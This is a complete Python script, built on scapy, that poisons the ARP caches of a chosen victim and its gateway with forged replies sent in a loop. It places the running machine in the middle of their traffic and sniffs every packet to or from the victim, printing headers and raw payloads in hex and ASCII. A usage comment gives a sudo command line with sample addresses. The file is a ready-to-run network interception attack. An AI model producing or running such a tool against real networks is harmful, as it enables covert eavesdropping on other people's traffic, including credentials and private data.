from scapy.all import *
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP, TCP, UDP, ICMP
import sys
import time
import threading

def getMAC(ip):
    ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=5, retry=3, verbose=False)
    if ans:
        return ans[0][1].hwsrc

def ARPspoof(srcIP, targetIP, targetMAC):
    arp = ARP(op=2, psrc=srcIP, pdst=targetIP, hwdst=targetMAC)
    send(arp, verbose=False)

def restoreARP(victimIP, gatewayIP, victimMAC, gatewayMAC):
    arp1 = ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=victimMAC, hwsrc=gatewayMAC)
    arp2 = ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst=gatewayMAC, hwsrc=victimMAC)
    send(arp1, count=3, verbose=False)
    send(arp2, count=3, verbose=False)

def sniff_packets(target_ip):
    def process_packet(packet):
        print("=== New Packet ===")
        if packet.haslayer(IP):
            ip_layer = packet.getlayer(IP)
            print(f"IP {ip_layer.src} -> {ip_layer.dst}")
            print(f"TTL: {ip_layer.ttl}")
            print(f"IP ID: {ip_layer.id}")
            print(f"IP Flags: {ip_layer.flags}")
            print(f"IP Fragment Offset: {ip_layer.frag}")
            print(f"IP Protocol: {ip_layer.proto}")
        
        if packet.haslayer(TCP):
            tcp_layer = packet.getlayer(TCP)
            print(f"TCP {tcp_layer.sport} -> {tcp_layer.dport}")
            print(f"Sequence Number: {tcp_layer.seq}")
            print(f"Acknowledgment Number: {tcp_layer.ack}")
            print(f"Flags: {tcp_layer.flags}")
            print(f"Window Size: {tcp_layer.window}")
            print(f"Urgent Pointer: {tcp_layer.urgptr}")

        if packet.haslayer(UDP):
            udp_layer = packet.getlayer(UDP)
            print(f"UDP {udp_layer.sport} -> {udp_layer.dport}")
            print(f"Length: {udp_layer.len}")
            print(f"Checksum: {udp_layer.chksum}")

        if packet.haslayer(ICMP):
            icmp_layer = packet.getlayer(ICMP)
            print(f"ICMP Type: {icmp_layer.type} Code: {icmp_layer.code}")
            print(f"ICMP ID: {icmp_layer.id} Sequence: {icmp_layer.seq}")

        # Print raw payload data if available
        if packet.haslayer(Raw):
            raw_layer = packet.getlayer(Raw)
            raw_data = raw_layer.load
            # Convert raw data to a hex dump
            hex_data = ' '.join(f'{byte:02x}' for byte in raw_data)
            # Convert raw data to printable ASCII characters, replace non-printable with '.'
            printable_data = ''.join((chr(byte) if 32 <= byte <= 126 else '.') for byte in raw_data)
            print(f"Raw Data (Hex): {hex_data}")
            print(f"Raw Data (ASCII): {printable_data}")

    print(f"Starting packet sniffing for target IP: {target_ip}...")
    sniff(filter=f"ip host {target_ip}", prn=process_packet, store=0)

def main(gatewayIP, victimIP):
    victimMAC = getMAC(victimIP)
    gatewayMAC = getMAC(gatewayIP)

    if victimMAC is None or gatewayMAC is None:
        print("Cannot find MAC address")
        exit()

    print(f'Start Spoofing -> VICTIM IP {victimIP}')
    print(f'{victimIP}: POISON ARP Table {gatewayMAC} -> {victimMAC}')

    try:
        # Start the sniffing thread
        sniff_thread = threading.Thread(target=sniff_packets, args=(victimIP,))
        sniff_thread.start()

        while True:
            ARPspoof(gatewayIP, victimIP, victimMAC)
            ARPspoof(victimIP, gatewayIP, gatewayMAC)
            time.sleep(3)
    except KeyboardInterrupt:
        restoreARP(victimIP, gatewayIP, victimMAC, gatewayMAC)
        print("Terminated Spoofing -> RESTORED ARP TABLE")

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: python arp_sniff.py {victim IP address} {gateway IP address}")
        exit()
    victimIP = sys.argv[1]
    gatewayIP = sys.argv[2]

    main(gatewayIP, victimIP)

# sudo python3 arp_sniff.py 192.168.0.15 192.168.0.1


